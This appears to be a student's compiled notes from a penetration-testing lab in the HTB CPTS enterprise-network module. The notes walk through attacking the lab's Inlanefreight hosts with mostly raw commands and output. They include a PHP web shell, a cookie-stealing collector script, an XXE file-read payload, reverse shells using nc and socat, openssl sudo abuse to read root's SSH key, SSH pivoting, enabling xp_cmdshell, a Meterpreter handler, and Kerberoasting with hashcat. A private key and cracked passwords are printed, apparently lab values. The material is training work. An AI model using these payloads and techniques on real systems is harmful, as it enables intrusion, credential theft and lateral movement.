# Notes - Extracted Evidence

Compiled from ACME-IPT engagement notes (Attacking Enterprise Networks vault).

---

### #### **Enumeration Results**
_Source: External-Attack1, line ~223_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ sudo tee -a /etc/hosts > /dev/null <<EOT                                                                                         

## inlanefreight hosts 
10.129.32.24 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local monitoring.inlanefreight.local
EOT


```

---

### #### **Service Enumeration & Exploitation**
_Source: External-Attack1, line ~253_

```
──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ ftp 10.129.229.147
Connected to 10.129.229.147.
220 (vsFTPd 3.0.3)
Name (10.129.229.147:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45250|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
226 Directory send OK.
ftp> get flag.txt

```

---

### #### **SSH**
_Source: External-Attack1, line ~277_

```
nc -nv 10.129.229.147
(UNKNOWN) [10.129.203.101] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

---

### #### **SSH**
_Source: External-Attack1, line ~284_

```
ssh admin@10.129.203.101

The authenticity of host '10.129.203.101 (10.129.203.101)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.101' (ECDSA) to the list of known hosts.
admin@10.129.203.101's password: 
Permission denied, please try again.

```

---

### #### **blog.inlanefreight.local**
_Source: External-Attack1, line ~363_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ curl -s http://blog.inlanefreight.local/ | grep drupal                 
<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
        <a href="/user/login" data-drupal-link-system-path="user/login">Log in</a>
        <a href="/" data-drupal-link-system-path="&lt;front&gt;" class="is-active">Home</a>
    <div data-drupal-messages-fallback class="hidden"></div>
      No front page content has been created yet.<br />Follow the <a target="_blank" href="https://www.drupal.org/docs/user_guide/en/index.html">User Guide</a> to start building your site.
    <div class="search-block-form block block-search container-inline" data-drupal-selector="search-block-form" id="block-bartik-search" role="search">
        <input title="Enter the terms you wish to search for." data-drupal-selector="edit-keys" type="search" id="edit-keys" name="keys" value="" size="15" maxlength="128" class="form-search" />
<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions"><input class="search-form__submit button js-form-submit form-submit" data-drupal-selector="edit-submit" type="submit" id="edit-submit" value="Search" />
        <a href="/contact" data-drupal-link-system-path="contact">Contact</a>
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
                                                                           
```

---

### #### **Automated ID Enumeration**
_Source: External-Attack1, line ~403_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ COOKIE="session=eyJsb2dnZWRfaW4iOnRydWV9.aif58A.MA7cXAxfAcQUTJN_Kkk-IfsVv_A"
  
for i in $(seq 1 50); do                                                             
  result=$(curl -s \
    -H "Cookie: $COOKIE" \
    -H "Host: careers.inlanefreight.local" \
    "http://careers.inlanefreight.local/profile?id=$i" | grep -oP 'HTB\{[^}]+\}')
  if [ -n "$result" ]; then
    echo "[+] Flag found at ID $i: $result"
    break
  fi     
done
[+] Flag found at ID 4: HTB{8f40ecf17f681612246fa5728c159e46}

```

---

### #### **dev.inlanefreight.local**
_Source: External-Attack1, line ~479_

```
        php
<?php system($_GET['cmd']); ?>

```

---

### #### **dev.inlanefreight.local**
_Source: External-Attack1, line ~500_

```
─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.220] from (UNKNOWN) [10.129.37.156] 54420
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@879145b4cf73:/var/www/html/uploads$ cd ../../
cd ../../
www-data@879145b4cf73:/var/www$ ls
ls

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~180_

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~200_

```
sudo php -S 0.0.0.0:4444

```

---

### #### **tracking.inlanefreight.local**
_Source: External-Attack2, line ~274_

```
HTB{49f0bad299687c62334182178bfd75d8}
```

---

### #### **shopdev2.inlanefreight.local**
_Source: External-Attack2, line ~295_

```
        xml
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

---

### #### **shopdev2.inlanefreight.local**
_Source: External-Attack2, line ~310_

```
        xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>
        undefined
    </subtotal>
    <userid>
        &xxetest;
    </userid>
</root>
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~506_

```
python3 -c 'import pty;pty.spawn("/bin/bash")'; 
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~516_

```
$ socat file:`tty`,raw,echo=0 tcp-listen:4443

```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~523_

```
$ nc -lnvp 4444

listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~534_

```
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

---

### #### **Post-Exploitation Persistence**
_Source: Internal-Testing, line ~7_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ ssh srvadm@10.129.54.18         
The authenticity of host '10.129.54.18 (10.129.54.18)' can't be established.
ED25519 key fingerprint is: SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.54.18' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
srvadm@10.129.54.18's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 21 Jun 2026 10:29:07 AM UTC

  System load:                      3.54
  Usage of /:                       93.6% of 13.72GB
  Memory usage:                     34%
  Swap usage:                       0%
  Processes:                        464
  Users logged in:                  0
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.54.18
  IPv6 address for ens160:          dead:beef::250:56ff:fe8a:9748
  IPv4 address for ens192:          172.16.8.120

  => / is using 93.6% of 13.72GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

82 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
$ 

```

---

### ##### **Local Privilege Escalation**
_Source: Internal-Testing, line ~66_

```
$ sudo -l

Matching Defaults entries for srvadm on dmz01:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

---

### ##### **Local Privilege Escalation**
_Source: Internal-Testing, line ~80_

```
        
LFILE=file_to_read
openssl enc -in "$LFILE"

```

---

### ##### **Local Privilege Escalation**
_Source: Internal-Testing, line ~87_

```
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE
-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----

```

---

### ##### Establishing Persistence
_Source: Internal-Testing, line ~134_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ chmod 600 id_rsa             
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ ssh -i id_rsa root@10.129.54.18
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 21 Jun 2026 11:04:23 AM UTC

  System load:                      0.16
  Usage of /:                       93.7% of 13.72GB
  Memory usage:                     60%
  Swap usage:                       0%
  Processes:                        463
  Users logged in:                  1
  IPv4 address for br-65c448355ed2: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.54.18
  IPv6 address for ens160:          dead:beef::250:56ff:fe8a:9748
  IPv4 address for ens192:          172.16.8.120

  => / is using 93.7% of 13.72GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

82 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 20 09:53:09 2025
root@dmz01:~# ls
flag.txt  snap
root@dmz01:~# 

```

---

### ##### **Setting Up Pivoting - SSH**
_Source: Internal-Testing, line ~208_

```
──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ ssh -D 8081 -i id_rsa root@10.129.229.147
The authenticity of host '10.129.229.147 (10.129.229.147)' can't be established.
ED25519 key fingerprint is: SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.147' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 4.0

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

82 updates can be applied immediately.
16 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Aug 20 09:53:09 2025
root@dmz01:~#

```

---

### ##### **Setting Up Pivoting - SSH**
_Source: Internal-Testing, line ~255_

```
$ grep socks4 /etc/proxychains.conf 

#       socks4  192.168.1.49    1080
#       proxy types: http, socks4, socks5
socks4  127.0.0.1 8081

```

---

### #### **Enumerating 172.16.8.20 - DotNetNuke (DNN)**
_Source: Internal-Testing, line ~542_

```
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~611_

```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~636_

```
root@dmz01:/tmp# nc -lnvp 443

Listening on 0.0.0.0 443
Connection received on 172.16.8.20 58480
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
ACADEMY-AEN-DEV01
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~853_

```

        
subzeroxi11@htb[/htb]$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN

OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1n  15 Mar 2022
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.129.203.111 [10.129.203.111] port 22.

<SNIP>

debug1: Authentication succeeded (publickey).
Authenticated to 10.129.203.111 ([10.129.203.111]:22).
debug1: Remote connections from 172.16.8.120:443 forwarded to local address 0.0.0.0:7000
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: Forwarding listen address "172.16.8.120" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.8.120:443, connect 0.0.0.0:7000

Next, execute the teams.exe payload from the DEV01 host, and if all goes to plan, we'll get a connection back.

        shellsession
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (175174 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:51146 ) at 2022-06-22 12:21:25 -0400

(Meterpreter 2)(c:\windows\system32\inetsrv) > getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
```

---

### (no section header)
_Source: AD-Compromise, line ~8_

```
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

---

### (no section header)
_Source: AD-Compromise, line ~25_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks/ligolo]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 14:32:18.194423  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$2fe924612c384e0b916798b6d76e529b$6a5bc27acb169a4fe97583395bed105e76ba2592f5a41584ffc246c91321475e1c5159ee3bbf83a0ecfb23b7c73166818f36f90bb8bb79686d9d1b50a5585168af73c04f9cd0e39b49e6e2a1272415a3746d474dd8d91adfdf919599856a4b583d6175177b3476e4b68907363d6af81056086c1766e91cb16c76d68d2f215d37a84d2582b1c69ded4f37bf25c064a100001245c0328d6b593828fcae43886686c670312e52e64268e0ab03649f69620f25419bfcb3f483cbdb8290fe671147a75da347a18a20f54c3b88acb19e068f733f113d5447dba527cea6aebe0fed3f9b88a5a445522b513743b66ccb4939666f35d94af5b9f050bbf0dc95322539895afe412d3e3272c923b3788f697a1b6dec4660a75c1acbea478aa9b2698e864dcad86af9c84c9c93d1a8c1fe094f9a7afaf4a4fafa2a9751150584c0e69ec36ee95760c0764faa0d21ddd25f1c2d576d593ec8dc9ab634bb2f2a55dbe90a3731916256d0262a8c7284d85c3f53807860d09a715279acfa5caa02e22a62cb6fee5451286e1f1d643590dc11e14ddb615eacc2d667c98f9ba4f7514cb1850d3d73ca85d403dc1c01cd8f0c5762b9850e73f2cd0128b484bf920fb1f8d03d3d5db86bf4a7b5c2417d62472cad988c16c345b3dd48499a91b878a2a5dec95d2c72e0cd69b56483cb4379b4253d6623522e53468a3fe226095521d6ed6b5a7ea1a6e698689a9e50bf7c092e3b867e8c30f65a6cdfc4208c2456f5df54f184b8ddaaf1d6eae98a3297c5ae05bc7700e6a585c0908a5fefcb5498b19f50d2af27b368a311bdd1676054b028173d2dc96c94b1eae59d8ef0818987dd9a926a412abfb89ec7542beee43d5e3d06935f04ef5b32d99560252a11cd33c8aab473ab8718c45c5a2e47738951e8318117ca02e7080d56693f9ba467d079fe1e5ec5456600a69d03b7c596c7e2796234687cc8bd3c6e5fd336bf34ec457290d54cc7bd9327b92e16b9421f13cb8045569ab09928b76bdd9a8c6fd7f790b4d96dae2479b35f0b91e57349fb615d4167b6b51a9af9fa5af3be79cd165299f6fd667a95a2393975469a9ec5d8a5f1bc97d29781409009bd2e271ca91aa2e5fbf6d3ad6a0dad98bdf269bf6cb6d7cca5769512f0908d398adf4a8212fa1c577601e339aecacf0f4484b86cd9ca5ef704f63ccbd5bf23f84c461a1ccc3791ec7101e138cfd6c341a36bc2541e7f00d2983d65a047e89af212ceccbfda11219a94b321eaaa6a50ed2bb60f8e2b57da71e803afc69c97bb063e6aa2b374c357a63b5ca07b481b2a9f09b7421019fbe69dbcfbb8db140747bd37c9228aab807c2c9594a5119961dece53e43861cc35f3

```

---

### (no section header)
_Source: AD-Compromise, line ~43_

```
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks/ligolo]
└─$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i7-13620H, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5603 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$2fe924612c384e0b916798b6d76e529b$6a5bc27acb169a4fe97583395bed105e76ba2592f5a41584ffc246c91321475e1c5159ee3bbf83a0ecfb23b7c73166818f36f90bb8bb79686d9d1b50a5585168af73c04f9cd0e39b49e6e2a1272415a3746d474dd8d91adfdf919599856a4b583d6175177b3476e4b68907363d6af81056086c1766e91cb16c76d68d2f215d37a84d2582b1c69ded4f37bf25c064a100001245c0328d6b593828fcae43886686c670312e52e64268e0ab03649f69620f25419bfcb3f483cbdb8290fe671147a75da347a18a20f54c3b88acb19e068f733f113d5447dba527cea6aebe0fed3f9b88a5a445522b513743b66ccb4939666f35d94af5b9f050bbf0dc95322539895afe412d3e3272c923b3788f697a1b6dec4660a75c1acbea478aa9b2698e864dcad86af9c84c9c93d1a8c1fe094f9a7afaf4a4fafa2a9751150584c0e69ec36ee95760c0764faa0d21ddd25f1c2d576d593ec8dc9ab634bb2f2a55dbe90a3731916256d0262a8c7284d85c3f53807860d09a715279acfa5caa02e22a62cb6fee5451286e1f1d643590dc11e14ddb615eacc2d667c98f9ba4f7514cb1850d3d73ca85d403dc1c01cd8f0c5762b9850e73f2cd0128b484bf920fb1f8d03d3d5db86bf4a7b5c2417d62472cad988c16c345b3dd48499a91b878a2a5dec95d2c72e0cd69b56483cb4379b4253d6623522e53468a3fe226095521d6ed6b5a7ea1a6e698689a9e50bf7c092e3b867e8c30f65a6cdfc4208c2456f5df54f184b8ddaaf1d6eae98a3297c5ae05bc7700e6a585c0908a5fefcb5498b19f50d2af27b368a311bdd1676054b028173d2dc96c94b1eae59d8ef0818987dd9a926a412abfb89ec7542beee43d5e3d06935f04ef5b32d99560252a11cd33c8aab473ab8718c45c5a2e47738951e8318117ca02e7080d56693f9ba467d079fe1e5ec5456600a69d03b7c596c7e2796234687cc8bd3c6e5fd336bf34ec457290d54cc7bd9327b92e16b9421f13cb8045569ab09928b76bdd9a8c6fd7f790b4d96dae2479b35f0b91e57349fb615d4167b6b51a9af9fa5af3be79cd165299f6fd667a95a2393975469a9ec5d8a5f1bc97d29781409009bd2e271ca91aa2e5fbf6d3ad6a0dad98bdf269bf6cb6d7cca5769512f0908d398adf4a8212fa1c577601e339aecacf0f4484b86cd9ca5ef704f63ccbd5bf23f84c461a1ccc3791ec7101e138cfd6c341a36bc2541e7f00d2983d65a047e89af212ceccbfda11219a94b321eaaa6a50ed2bb60f8e2b57da71e803afc69c97bb063e6aa2b374c357a63b5ca07b481b2a9f09b7421019fbe69dbcfbb8db140747bd37c9228aab807c2c9594a5119961dece53e43861cc35f3:Repeat09
                                      
```

---

### (no section header)
_Source: AD-Compromise, line ~111_

```
PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~62_

```
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~105_

```
──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks/ligolo]
└─$ sudo ./proxy -selfcert
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.3

